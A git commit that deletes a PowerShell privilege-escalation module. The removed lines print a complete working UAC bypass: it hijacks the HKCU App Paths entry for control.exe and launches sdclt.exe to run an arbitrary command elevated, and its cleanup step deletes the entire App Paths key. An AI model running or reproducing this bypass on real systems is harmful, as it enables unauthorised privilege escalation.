de77cdc20d4bec5dc45ee878e023c70ae5c8a2d9
cybervaca <cybervaca@gmail.com>
2017-04-18 17:23:08 +0200

    Delete BypassUAC-HackPlayers-sdclt.ps1

--- data/module_source/privesc/BypassUAC-HackPlayers-sdclt.ps1
+++
@@ -1,9 +0,0 @@
-﻿function BypassUAC-HackPlayers-sdclt {
-param ([string]$comando)
-$comando = "c:\Windows\System32\WindowsPowerShell\v1.0\" + $comando
-$key = "registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"
-New-Item -Path $key -force | out-null
-New-ItemProperty -Path $key -name '(Default)' -Value $comando -PropertyType string -Force | Out-Null
-Start-Process sdclt.exe ; sleep -Seconds 3
-Remove-Item -Path "registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\" -Force | out-null
-}
